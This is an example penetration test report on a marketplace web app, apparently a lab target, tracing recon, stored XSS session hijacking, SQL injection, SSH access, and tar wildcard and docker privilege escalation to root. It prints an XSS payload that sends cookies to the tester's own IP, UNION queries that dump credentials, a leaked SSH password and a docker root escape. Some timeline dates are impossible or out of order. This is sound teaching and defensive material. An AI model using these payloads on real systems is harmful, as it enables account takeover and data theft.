<h2> Penetration Test Report - Example</h2> 
<h3>The Marketplace's infrastructure </h3>

<h3> Table of Contents </h3>

- [Executive Summary](#executive-summary)
  - [Brief summary of findings](#brief-summary-of-findings)
  - [Timeline](#timeline)
  - [Summary of the test scope](#summary-of-the-test-scope)
  - [Testing methodology used and Summary of metrics and measures, including the number of findings, listed by severity level](#testing-methodology-used-and-summary-of-metrics-and-measures-including-the-number-of-findings-listed-by-severity-level)
  - [Metrics and Mesures](#metrics-and-measures)
  - [Objectives of the testing effort, including the main topic or purpose of the test and report](#objectives-of-the-testing-effort-including-the-main-topic-or-purpose-of-the-test-and-report)
- [Statement of Scope](#statement-of-scope)
- [Statement of Methodology](#statement-of-methodology)
- [Statement of Limitations](#statement-of-limitations)
- [Testing Narrative](#testing-narrative)
    - [Remote System Discovery (nmap)– Reconnaissance/Discovery](#remote-system-discovery-nmap-reconnaissancediscovery)
    - [Cross Site Scripting (XSS) – Weaponization/Attack](#cross-site-scripting-xss--weaponizationattack)
    - [Cross Site Scripting (XSS) - Delivery/Gaining Access](#cross-site-scripting-xss---deliverygaining-access)
    - [Cross Site Scripting (XSS) – Exploitation/Installation – Escalating Privileges](#cross-site-scripting-xss--exploitationinstallation--escalating-privileges)
    - [Cross Site Scripting (XSS) – Command & Control/Objective – System Browsing](#cross-site-scripting-xss--command--controlobjective--system-browsing)
    - [SQL Injection – Additional Discovery](#sql-injection--additional-discovery)
    - [SQL Injection – Weaponization/Install Additional Tools](#sql-injection--weaponizationinstall-additional-tools)
    - [SQL Injection – Delivery/Attack](#sql-injection--deliveryattack)
    - [SQL Injection – Exploitation/Installation - Attack](#sql-injection--exploitationinstallation---attack)
    - [SQL Injection – Command & Control/Objective](#sql-injection--command--controlobjective)
    - [Command Injection/SSH – Additional Discovery](#command-injectionssh--additional-discovery)
    - [Command Injection/SSH - Weaponization/Gaining Access](#command-injectionssh---weaponizationgaining-access)
    - [Command Injection/SSH - Delivery/System Browsing](#command-injectionssh---deliverysystem-browsing)
    - [Command Injection/SSH – Exploitation/Installation – Privilege Escalation](#command-injectionssh--exploitationinstallation--privilege-escalation) 
    - [Command Injection/SSH - Command & Control/ Privilege Escalation /Objective](#command-injectionssh---command--control-privilege-escalation-objective)
- [Findings](#findings)
  - [Calculating and documenting the risks of the vulnerabilities, Common Vulnerability Scoring system, CVSS.](#calculating-and-documenting-the-risks-of-the-vulnerabilities-common-vulnerability-scoring-system-cvss)
  - [OWASP Risk Rating Methodology for estimating the risk of a vulnerability](#owasp-risk-rating-methodology-for-estimating-the-risk-of-vulnerability)
- [Findings and recommendations for remediation](#findings-and-recommendations-for-remediation)
  - [Technical details necessary for IT, information security, and development teams to use to address the issues.](#providing-technical-details-necessary-for-it-information-security-and-development-teams-to-use-to-address-the-issues---recommendations)
- [Conclusion](#conclusion)
- [Disclaimer](#disclaimer)
 
<h3>Executive Summary</h3>

<i><b>Ethical Security</b></i> company was contracted by Marketplace industry to conduct a penetration test in order to determine its exposures to a targeted attack. All activities were conducted in a manner that simulated a malicious actor engaged in a targeted attack against Marketplace industry.<br>

<b>Target goals : </b>
<ul>
  <li>Identifying if a remote attacker could penetrate Marketplace industry’s defenses </li>
  <li>The effectiveness of an organization's security policy.</li>
  <li>Confidentiality of the company’s private data.</li>
  <li>Internal infrastructure and availability of Marketplace’s information systems.</li>
  <li>Reduce risk of attack: Mimicking real hacker behaviors provides greater visibility into organization’s weakness.</li>
  <li>Backdoors in the operating system</li>
</ul>  

Efforts were placed on the identification and exploitation of security weaknesses that could allow a remote attacker to gain unauthorized access to organizational data. The attacks were conducted with the level of access that a general Internet user would have. The assessment was conducted in accordance with the recommendations outlined in NIST SP 800-1151 with all tests and actions being conducted under controlled conditions.
<h3>Brief Summary of Findings</h3>
Initial reconnaissance of the <b>Marketplace’s</b> network resulted in the discovery of a few open TCP ports such as 22/TCP SSH Version: openSSH 7.6p1 Ubuntu0.3 and 80/TCP HTTP-Server-title: The Marketplace.<br><br>
Steps:<br> (1) An examination of these ports revealed a <b>Cross Site Scripting (XSS), SQL Injection and Command Injection via SSH (Secure Shell) connection </b> vulnerabilities. Also, a <b>docker and a tar wildcard privilege escalation</b> vulnerability.<br> (2) After exploiting Marketplace’s webpage, we were able to gain access to an administration account with <b>session hijacking through XSS</b>.<br> (3) In addition, gaining access to the admin account we discovered that there is an <b>information exposure through query strings in URL</b>.<br> (4) The next move was to use <b>SQL injection commands in URL with Burp Suite tool</b> to exploit the database and take information. With the database’s exploitation we found database’s tables: <b> Users, usernames and passwords hashes and cracked them with John the Ripper tool </b>, also we found through database’s table:<b> <i>Messages</i>, a message to a user from the administrator/system for a SSH password change and the new password </b>.<br> (5) We continue with a <b>SSH connect to the specific user with the provided SSH password and we gain access to user’s system</b> with remote access through SSH connection.<br> (6) Finally, we <b>discovered a tar backup.tar * file in the user’s files and we exploit wildcard for privilege escalation to another user</b>. As we gain access to another user and found that he is <b>privileged to use docker, we exploit it with shell to escalate our privileges to root shell</b>.

<h3>Timeline</h3>
<table>
  <tr>
    <th>Steps</th>
    <th>Description</th>
    <th>Vulnerability</th>
    <th>Risk Rating</th>
    <th>Timeline</th>
  </tr>
  <tr>
    <td>1</td>
    <td>Active Reconnaissance</td>
    <td>Open Ports</td>
    <td>Moderate</td>
    <td>25-06-22</td>
  </tr>
  <tr>
    <td>2</td>
    <td>Trying XSS in Website</td>
    <td>XSS</td>
    <td>High</td>
    <td>26-06-22</td>
  </tr>
  <tr>
    <td>3</td>
    <td>Successful stored XSS</td>
    <td>XSS</td>
    <td>High</td>
    <td>26-06-22</td>
  </tr>
  <tr>
    <td>4</td>
    <td>Session Hijacking with XSS</td>
    <td>Session Hijacking</td>
    <td>Extreme</td>
    <td>27-06-22</td>
  </tr>
  <tr>
    <td>5</td>
    <td>Successful Privilege Escalation to Admin Account</td>
    <td>Session Hijacking</td>
    <td>Extreme</td>
    <td>28-06-22</td>
  </tr>
  <tr>
    <td>6</td>
    <td>Information Exposure in URL</td>
    <td>Forced browsing</td>
    <td>High</td>
    <td>28-06-22</td>
  </tr>
   <tr>
    <td>7</td>
    <td>Trying SQL injection in URL</td>
    <td>SQL Injection</td>
     <td>High</td>
     <td>29-06-22</td>
  </tr>
   <tr>
    <td>8</td>
    <td>Successful SQL injection in URL</td>
    <td>SQL Injection</td>
     <td>Moderate</td>
     <td>30-06-22</td>
  </tr>
   <tr>
    <td>9</td>
    <td>Exploit Database, tables, columns and data</td>
     <td>SQL Injection</td>
    <td>Moderate</td>
     <td>30-06-22</td>
  </tr>
   <tr>
    <td>10</td>
    <td>Discover in table: Messages, in message content, a SSH password</td>
    <td>SQL Injection</td>
     <td>Extreme</td>
     <td>30-06-22</td>
  </tr>
   <tr>
    <td>11</td>
    <td>SSH Connection</td>
    <td>Command Injection</td>
     <td>High</td>
     <td>31-06-22</td>
  </tr>
  <tr>
    <td>12</td>
    <td>System file checking</td>
    <td>-</td>
     <td>-</td>
     <td>31-06-22</td>
  </tr>
   <tr>
    <td>13</td>
    <td>Found a Tar wildcard file</td>
    <td>-</td>
     <td>-</td>
     <td>01-07-22</td>
   </tr>
   <tr>
    <td>14</td>
    <td>Exploit tar wildcard and Privilege Escalation</td>
    <td>Privilege Escalation</td>
     <td>Moderate</td>
     <td>02-07-22</td>
  </tr>
   <tr>
    <td>15</td>
    <td>System file checking</td>
    <td>-</td>
     <td>-</td>
     <td>02-06-22</td>
  </tr>
   <tr>
    <td>16</td>
    <td>Found user using Docker</td>
    <td>-</td>
     <td>-</td>
     <td>03-06-22</td>
  </tr>
   <tr>
    <td>17</td>
    <td>Exploit Docker and Privilege Escalation to root</td>
    <td>Privilege Escalation</td>
     <td>Extreme</td>
     <td>03-06-22</td>
  </tr>
   <tr>
    <td>18</td>
    <td>Analyze Findings</td>
    <td>-</td>
     <td>-</td>
     <td>04-06-22</td>
  </tr>
   <tr>
    <td>19</td>
    <td>Report</td>
    <td>-</td>
     <td>-</td>
     <td>07-06-22</td>
  </tr>
</table>

<h3>Summary of the test Scope</h3>

The scope of this Penetration Test was limited to a single internet facing web application portal. This is a Marketplace application and the specific instantiation of the portal we were asked to test, was the vulnerabilities we could find. Also, we will perform a <b>black-box penetration testing</b> (pentesting) as external attackers-testers aiming at identifying vulnerabilities in the application and show exactly how. The landing page to the application under review was at the following address:
<table>
  <tr>
    <th>Application	Authentication</th>
    <th> Landing Page</th>
  </tr>
  <tr>
    <td>The Marketplace Webpage</td>
    <td>https://marketplace.com</td>
  </tr>
</table>
<h3>Testing Methodology Used and Summary of metrics and measures, including the number of findings, listed by severity level</h3>
<b>Firstly</b>, we used the <b>cyber kill chain</b> methodology, which is essentially a Lockheed Martin cybersecurity model that traces the stages of a cyber-attack, detects vulnerabilities, and assists security teams in stopping attacks at each point of the chain. The term kill chain was borrowed from the military, which refers to the framework of an attack. It consists of recognizing a target, dispatching it, making a judgment, issuing an order, and eventually destroying the target.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/78affee0-4ef8-4f9a-8eb2-589a8cdd35a9)

<b>Lockheed Martin’s original cyber kill chain model contained seven sequential steps:</b><br><br>
<b>Phase 1: Reconnaissance</b><br>
During the Reconnaissance phase, we scanned the Marketplace website with nmap tool and explored vulnerabilities and weaknesses that could be exploited within the network. <br>
<b>Phase 2: Weaponization</b>
During the Weaponization phase, we created an attack vector, such as remote access, XSS, SQL Injection or Command Injection that can exploit a known vulnerability.<br> 
<b>Phase 3: Delivery</b><br>
In the Delivery step, we launched the attacks. <br>
<b>Phase 4: Exploitation</b><br>
In the Exploitation phase, the malicious code is executed within the victim’s system.<br>
<b>Phase 5: Installation</b><br>
Immediately following the Exploitation phase, the malware or other attack vector will be installed on the victim’s system.<br>
<b>Phase 6: Command and Control</b><br>
In Command & Control, we have been able to use the exploits to assume remote control of a device or identity within the target network. <br>
<b>Phase 7: Actions on Objective</b><br>
In this stage, we took root privileges.<br><br>
We also used Penetration Testing Phases from NIST SP 800-115. In this process, we used the information gathered during the discovery phase to gain initial access to a system. Once we establish a foothold, we manage to escalate our access until we gain complete administrative control of the system. 

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/a4f196b9-1a0b-41c0-aed7-293cf685fd4e)

<h3>Metrics and Measures</h3>
<b>Secondly</b>, we used the OWASP, or Open Web Application Security Project, which is a set of standards and guidelines for the security of web applications, and is often the starting point for IT personnel when initially venturing into the realm of penetration testing. OWASP provides several resources on its own to improve the security posture of both internal and external web applications by providing companies with a comprehensive list of vulnerability categories for web applications, as well as ways to mitigate or remediate them.<br><br>
<b>The OWASP Top 10</b> is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.<br>
<table>
  <tr>
    <th>No.</th>
    <th>Vulnerability</th>
    <th>Severity</th>
    <th>OWASP -Metrics and Measures </th>
  </tr>
  <tr>
    <td>1</td>
    <td>SQL Injection</td>
    <td>Extreme</td>
    <td>https://owasp.org/www-community/attacks/SQL_Injection</td>
  </tr>
  <tr>
    <td>2</td>
    <td>Cross Site Scripting</td>
    <td>Extreme</td>
    <td>https://owasp.org/www-community/attacks/xss/</td>
  </tr>
  <tr>
    <td>3</td>
    <td>Command Injection</td>
    <td>High</td>
    <td>https://owasp.org/www-community/attacks/Command_Injection</td>
  </tr>
  <tr>
    <td>4</td>
    <td>Privilege Escalation</td>
    <td>Extreme</td>
    <td>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation</td>
  </tr>
  <tr>
    <td>5</td>
    <td>Docker</td>
    <td>High</td>
    <td>https://owasp.org/www-project-docker-top-1t0/</td>
  </tr>
  <tr>
    <td>6</td>
    <td>Tar - Wildcard</td>
    <td>Moderate</td>
    <td>https://owasp.org/www-pdf-archive/OWASP_Testing_Guide_v3.pdf</td>
  </tr>
</table>

<h3>Objectives of the testing effort, including the main topic or purpose of the test and report</h3>
The practice of analyzing and validating Marketplace application accomplishes what it is designed to do is known as software testing. The advantages of this testing include bug prevention, reduced development costs, and improved performance. The sooner development teams receive test feedback, the sooner they can address issues such as:
<ul>
  <li>Architectural flaws </li>
  <li>Poor design decisions</li>
  <li>Invalid or incorrect functionality</li>
  <li>Security vulnerabilities</li>
  <li>Scalability issues</li>
</ul>  
Penetration Testing is done in order to assess its vulnerability to a targeted attack. All operations were carried out in a way that imitated a malicious actor carrying out a targeted attack on the <b>Marketplace industry</b>.
After the Penetration, team members can share status, goals, and test results thanks to reporting and analytics. Advanced tools incorporate project metrics and display the results in a dashboard. Teams can rapidly evaluate a project's overall health and monitor interactions between test, development, and other project parts.
<h3>Statement of Scope</h3>
We performed an assessment of the Ethical Security Company Services in Greece in order to provide detailed analysis of: identification of application, system and network vulnerabilities; gaps in IT security governance; assessment of patching methodologies; current network security capabilities and potential existing security incidents. The assessment and reporting will be based on the NIST 800-53 MODERATE security controls.<br><br>

<table>
  <tr>
    <th>Criteria</th>
    <th>Response</th>
  </tr>
  <tr>
    <td>Project Title</td>
    <td>Penetration Testing Marketplace's Website</td>
  </tr>
  <tr>
    <td>Project Scope Description</td>
    <td>Web Application – The Marketplace</td>
  </tr>
  <tr>
    <td>Date Prepared</td>
    <td>07 June 2022</td>
  </tr>
  <tr>
    <td>Prepared by:</td>
    <td>George Ziras</td>
  </tr>
  <tr>
    <td>Deadline for Questions</td>
    <td>17 June 2022</td>
  </tr>
  <tr>
    <td>Host names</td>
    <td>https://marketplace.com</td>
  </tr>
  <tr>
    <td>IP addresses:</td>
    <td>10.10.110.33</td>
  </tr>
  <tr>
    <td>Agency:</td>
    <td>Ethical Security Company Services</td>
  </tr>
  <tr>
    <td>Assessment Category:</td>
    <td>Risk Assessment</td>
  </tr>
  <tr>
    <td>Hours of Testing:</td>
    <td>00:00 – 06:00</td>
  </tr>
  <tr>
    <td>Number of Hours to Complete the Project:</td>
    <td>156 Hours</td>
  </tr>
  <tr>
    <td>Cost</td>
    <td>23.658 €</td>
  </tr>
   <tr>
    <td>Remediate Methodology: </td>
    <td>OWASP Top 10</td>
  </tr>
  <tr>
    <td>Attack Methodology:</td>
    <td>Cyber Kill Chain& Pentest Phases</td>
  </tr>
</table>

<h3>Statement of Methodology</h3>
We used the <b>Open Web Application Security Project (OWASP)</b> framework that offers advice on how to create, buy, and maintain trustworthy and secure software applications. OWASP is well-known for its popular Top 10 list of web application security flaws. The OWASP Biggest 10 list of security vulnerabilities is based on developer community opinion on the top security dangers. Every few years, it is revised as hazards alter and new ones develop. <br>
Some of these Web security vulnerabilities have been found at Marketplace’s Web Application, such as XSS, SQL Injection and Command Injection.<br><br>
<b>Cross-Site Scripting (XSS)</b> attacks occur when:<br>
<ol type="1">
  <li>Data enters a Web application through an untrusted source, most frequently a web request.</li>
  <li>The data is included in dynamic content that is sent to a web user without being validated for malicious content.</li>
</ol>
<b>SQL injection</b> attack occurs when:<br><br>
<ol type="1">
  <li>An unintended data enters a program from an untrusted source.</li>
  <li>The data is used to dynamically construct a SQL query</li>
</ol>
<b>Command injection</b> is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.<br>
In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.

<h3>Statement of Limitations</h3>

<h3>Limitation of Time</h3>
When we performed penetration testing, we had a timeboxed assessment that needed to be completed in a predefined time period. The testing team has to identify potential threats and vulnerabilities, and produce results within this specified time period. This time of period was:
<br>
<table>
  <tr>
    <th>No.</th>
    <th>Day</th>
    <th>Time/Period</th>
  </tr>
  <tr>
    <td>1</td>
    <td>Monday</td>
    <td>Denied</td>
  </tr>
  <tr>
    <td>2</td>
    <td>Tuesday</td>
    <td>00:00 – 06:00</td>
  </tr>
  <tr>
    <td>3</td>
    <td>Wednesday</td>
    <td>00:00 – 06:00</td>
  </tr>
  <tr>
    <td>4</td>
    <td>Thursday</td>
    <td>00:00 – 06:00</td>
  </tr>
  <tr>
    <td>5</td>
    <td>Friday</td>
    <td>00:00 – 06:00</td>
  </tr>
  <tr>
    <td>6</td>
    <td>Saturday</td>
    <td>Denied</td>
  </tr>
  <tr>
    <td>7</td>
    <td>Sunday</td>
    <td>Denied</td>
  </tr>
</table>

<h3>Limitation of Access</h3>
We had Limitation of Access because we performed Black box penetration test and not a White box network vulnerability assessment, which helps to expose security threats by attacking the network from different angles. Also, for applications, we could conduct code reviews that will help us discover security threats and weaknesses that might not be apparent from dynamic testing such as encryption algorithms, how passwords are stored, etc.

<h3>Testing Narrative</h3>
<h3>Remote System Discovery (nmap)– Reconnaissance/Discovery</h3>
For the purposes of this penetration test, Marketplace provided minimal information outside of the organizational <b>domain name: marketplace.com</b>. The intent was to closely simulate an adversary without any internal information. To avoid targeting systems that were not owned by Marketplace Industry, all identified assets were submitted for ownership verification before any attacks were conducted. 
<br><br>
In an attempt to identify the potential attack surface, we examined the name server of the marketplace.com domain name:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/107d4c63-44b5-45c2-bd52-9e85a38f8631)
<br>
We discovered a few <b>open tcp ports such as 22/tcp SSH Version: openSSH 7.6p1 Ubuntu0.3 and 80/tcp HTTP-Server-title: The Marketplace.</b>
<br>
We browse the website: marketplace.com to discover web application vulnerabilities:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/a762396f-eb57-4d9b-818f-dec498ac047d)

<h3>Cross Site Scripting (XSS) – Weaponization/Attack</h3>
We signed up as a regular user and we tried to check about XSS Vulnerability, so we tried XSS Scripts and after these tries we succeeded with adding a new listing but with an alert(1) script in  JavaScript: <svg onload=’alert(1)’ / >.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/9f5d8b52-311f-4af5-8d53-c42ee21456ec)

Successfully the script worked and we had a pop up from the alert script.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/df74f950-a15f-4537-a4d9-943b59e28cd1)

After that, we reported the listing to admins <b>«Report listing to admins»</b> to see what the reply from them is and how fast it is. Some minutes later, after the reporting, the admin send us a message to our account. So, we used that to perform stored XSS to the webpage and take the admin’s session. To do that we started a PHP server to our machine and we insert our IP address to the script to take the reply and the session token-key there.<br><br>
Start PHP server:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/5b81bd65-adcb-4507-9632-c0af84bc7320)

<h3>Cross Site Scripting (XSS) - Delivery/Gaining Access</h3>

Now we used the script <svg onload= ‘var x=document.createElement(“IFRAME”); x.setAttribute(“src”,http:// OUR_IP_ADDRESS:8080/cookie?+document.cookie);document.body.appendChild(x);”/><br>
<ul>
  <li>The HTML < svg > element is a container for SVG graphics and we used it to bypass input validation. </li>
  <li>The "onload" will Execute a JavaScript immediately after a page has been loaded:</li>
  <li>The HTML iframe is used to display a web page within a web page and we used it so we can display our session cookie token.</li>
  <li>JavaScript can read cookies with the document.cookie property.</li>
  <li>The appendChild() method appends a node (element) as the last child of an element.</li>
  <li>http:// OUR_IP_ADDRESS:8080/cookie?+document.cookie is our IP address and it will send the cookie to PHP server.</li>
</ul>  
    
![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/6ff5edf1-16cf-4651-8eda-84dbdbf8deb5)

At the bottom left we can see that the HTML iframe is displayed with our session cookie token.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/5d81c6f7-3458-4d22-9716-9500f95abb8e)

The reply has been sent to PHP server with our Session Cookie token:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/0ef3db3c-8574-4d66-9187-da057474e317)

<h3>Cross Site Scripting (XSS) – Exploitation/Installation – Escalating Privileges</h3>
Admin review the report and send us a message then the script activated, it sends us admin’s Session Cookie token to the PHP server:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/5a0ebdb0-14b3-4f5f-819c-9ff77bb87cde)

Then the only thing we had to do is to change the value of the token from our session token to admin’s session token:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/5e0276e4-4842-4926-b8a8-802302bd37c2)

<h3>Cross Site Scripting (XSS) – Command & Control/Objective – System Browsing</h3>
When we changed the Session Token we successfully logged in to Admin’s account:

![269427782-50c57f67-5077-4c14-96ae-63f562581961](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/d9b47a8e-3d69-456b-b5d9-3f1dc97b29ec)

<h3>SQL Injection – Additional Discovery</h3>
After we completed the 1st cycle of <b>Cyber Kill Chain</b> and <b>Penetration Testing Phases</b>, logged in as admin we discovered a new vulnerability in the web application. There is an information exposure through query strings in URL. So, we check if SQL injection is possible in the web application.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/79167241-7ee9-4d98-9d4c-609aa64232f2)

<h3>SQL Injection – Weaponization/Install Additional Tools</h3>
Inserting in the URL as user the value ( ‘ ) we are checking if the web application is vulnerable to SQL injection. The database server responded with an error to SQL syntax. So, we will perform <b>Error – Based SQL injection</b>.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/ce2ce1d6-c22d-4cc7-b3a5-edb771d734ca)

We will perform all the SQL injection queries with Burp Suite tool. Burp Suite is an integrated platform/graphical tool for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/2e2be7ec-c0c8-44eb-b393-22ea09367169)

We used Repeater, a feature of Burp Suite tool, which is a simple feature for manually manipulating and reissuing individual HTTP and WebSocket messages/requests, and analyzing the application's responses.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/7f731f9c-40c7-4513-adea-502453b5aa75)

<h3>SQL Injection – Delivery/Attack</h3>
With repeater we sent a HTTP request with user value (‘ ’ group by 1,2,3,4,5-- ) to check how many columns exists. We discovered that there are no more than 5 columns so we continued checking and we conclude that there are 4 columns.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/4391d21c-7886-4857-8fc6-602ee445fd01)

After we found that 4 columns exist, we tried UNION ALL injection to find a pattern so our queries will be successful every time.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/9c7d5139-c26e-4a84-8b43-d183b65cf68e)

We used well-known SQL commands to receive the data we want from database:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/2ea6d457-d552-483e-b686-3305518030f9)

<h3>SQL Injection – Exploitation/Installation - Attack</h3>
First, we used the query:<b> ‘’UNION ALL SELECT GROUP_CONCAT (0x7c, schema_name, 0x7c), 2, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA--</b>, to take the name of the database that the web application is using. The database’s name was <b>‘|marketplace|’</b>:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/060f7c70-8659-4d03-ac94-e711b124e277)

We continue with the query:<b> ‘’UNION ALL SELECT GROUP_CONCAT (0x7c, table_name, 0x7c), 2, 3, 4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = ‘marketplace’--</b>, to take the names of the database’s tables that the web application is using. The database’s table names were <b>‘|items|, |messages|, |users|’</b>:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/492c1632-166a-4d3e-b332-233182c2d8d7)

Also, we used the query:<b> ‘’UNION ALL SELECT GROUP_CONCAT (0x7c, column_name, 0x7c), 2, 3, 4 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = ‘users’--</b>, to take the columns of the user’s table that the web application is using. The user’s table columns were <b>‘|id|, |username|, |password|, |isAdministrator|’</b>:

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/8f5c128b-2453-4489-91b1-adb184a4c27d)

<h3>SQL Injection – Command & Control/Objective</h3>
Also, we used the query: <b>‘’UNION ALL SELECT GROUP_CONCAT (0x7c, username, ’:’, password, 0x7c, ‘\n’), 2, 3, 4 FROM MARKETPLACE.USERS--</b>, to take the usernames and the hashed passwords from table USERS that the web application is using.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/39d1cd29-ea95-40f8-9341-15cc7c6a6b8c)

We cracked the hashed passwords with <i><b>John the Ripper</i></b> tool. John the Ripper is one of the oldest yet most familiar tools that professional pen testers still use when cracking passwords or checking password strengths. Its wide popularity, choice of free and open-source versions, as well as community support make it easily adoptable as a part of a hacker's toolkit.
<br><br>
John the Ripper works by using the dictionary method favored by attackers as the easiest way to guess a password. It takes text string samples from a word list using common dictionary words or common passwords. It can also deal with encrypted passwords, and address online and offline attacks.
<br><br>
We proceed to search the <b>‘message’</b> table with the same technique:<b> ‘’UNION ALL SELECT GROUP_CONCAT (0x7c, column_name, 0x7c), 2, 3, 4 FROM INFORMATION_SCHEMA.COLUMN WHERE TABLE_NAME= ‘messages’--</b>, to take the columns from table messages that the web application is using. The messages’s table columns were <b>|id|,|user_from|,|user_to|,|message_content|,|is_read|</b>.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/6bfc71db-4332-4f08-b09c-fff8319ca611)

Also, we used the query: <b>‘’UNION ALL SELECT GROUP_CONCAT (0x7c, user_from, ’:’, user_to,’:’,message_content, 0x7c, ‘\n’), 2, 3, 4 FROM MARKETPLACE.MESSAGES--</b>, to take the message content that a user sent to another user from table messages that the web application is using to store messages between users.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/7be1332e-2861-40ad-bac2-3730e7ca8353)

We discovered a message from user: System (1) to user: Jake (3), which displays a  weak SSH password detection and <b>a new generated temporary password: @b_ENXkGYUCAv3zJ</b>.

<h3>Command Injection/SSH – Additional Discovery</h3>

After we completed the 2nd cycle of <b>Cyber Kill Chain and Penetration Testing Phases</b>, exploiting the web application’s database server and retrieve information and valuable data about usernames and passwords. We discovered, that there is <b>an unchanged SSH password from the user: Jake, and we manage to connect to Jake’s device via SSH connection</b>. 
<br>
<br>
SSH refers both to the cryptographic network protocol and to the suite of utilities that implement that protocol. SSH uses the client-server model, connecting a Secure Shell client application, which is the end where the session is displayed, with an SSH server, which is the end where the session runs.

<h3>Command Injection/SSH - Weaponization/Gaining Access</h3>

We connected successfully with SSH to Jake’s device with the password we retrieved from the database:<b> @b_ENXkGYUCAv3zJ</b>.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/f34a3483-b417-43c3-9487-c8728688ce9f)

<h3>Command Injection/SSH - Delivery/System Browsing</h3>
We searched the files that Jake had in the device and we discovered <b>a tar file with wildcard * at the path: /opt/backups/backup.tar *</b>.

![269432096-0971bf2f-e0f1-496c-a483-ddaa9504c49c](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/cd3fd18d-995b-484a-a916-2c6ad200c2c0)

<h3>Command Injection/SSH – Exploitation/Installation – Privilege Escalation</h3>
Tar files with wildcards have an exploit that you gain privilege escalation. So, we used this payload to exploit the tar file and gain other user privileges. 

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/7e22eea7-7a0a-4a8f-b893-0eab4b059662)

After the tar file, with wildcard, exploitation in Jake’s system, we escalate our privileges and gain access to Michael’s system and we discovered that he is privileged to use docker.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/b5c8e4fb-07c9-4f75-9bcb-49f47a783aa4)

<b>Docker</b> is an open source containerization platform. It enables developers to package applications into containers—standardized executable components combining application source code with the operating system (OS) libraries and dependencies required to run that code in any environment.<br><br>
Docker has an exploit that allows privileged escalation by generating an interactive system shell. Docker exploit requires the user to be privileged enough to run docker and Michael has docker privileges.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/66c809ef-ce4a-4211-87f6-6958de401695)

<h3>Command Injection/SSH - Command & Control/ Privilege Escalation /Objective</h3>
After the command injection in Michael’s system and exploiting docker using the command:<b> docker run -v /:/mnt –rm -it alpine chroot /mnt /bin/bash</b>, we gain root privileges. 

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/8131f906-8e7d-4b76-8986-195f73555019)

We completed the 3rd cycle of Cyber Kill Chain and Penetration Testing Phases, while we gained access as Jake via SSH, then exploited tar file with wildcard in Jake’s system and gain access as Michael and finally we exploited docker because we had Michael’s privileges and gained access as root.

<h3>Findings</h3>

<h3>Calculating and documenting the risks of the vulnerabilities, Common Vulnerability Scoring system, CVSS.</h3>

The <b>Common Vulnerability Scoring System (CVSS)</b> is a free and open industry standard for determining the severity of computer system security flaws. CVSS seeks to assign vulnerability severity levels, allowing responders to prioritize responses and resources based on danger. Scores are determined by an algorithm that takes into account numerous variables that approximate the ease and impact of an exploit. The severity scale runs from 0 to 10, with 10 being the most severe. 

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/fe379600-84fe-4001-9719-b4bc8ed2860d)

<h3>OWASP Risk Rating Methodology for estimating the risk of vulnerability</h3>

The <b>OWASP Risk Rating Methodology</b> was developed by Jeff Williams, one of the OWASP organization's founders, as a way to quickly and correctly analyze the possibility and effect of a web application vulnerability. OWASP Risk Rating Methodology based on OWASP Risk Assessment Framework, which consist of Static application security testing and Risk Assessment tools, even though there are many SAST tools available for testers, but the compatibility and the environment setup process is complex.

![image](https://github.com/ZirasG/Penetration-Testing-Report/assets/145548499/56c015dd-fdd4-4ac7-a2c0-4b1e002983a1)

<h3>Findings and recommendations for remediation</h3>

<h3>Providing technical details necessary for IT, information security, and development teams to use to address the issues - Recommendations</h3>

<b>XSS Defense Philosophy</b>
<br>
<br>
An attacker must insert and execute malicious content in a webpage for an XSS attack to be successful. Each variable in a web application must be secured. Perfect injection resistance is achieved by ensuring that all variables are validated and then escaped or sanitized. Any variable that is not subjected to this method is a potential flaw. Frameworks make it simple to validate variables and escape or sanitize them.<br><br>
Examples: 

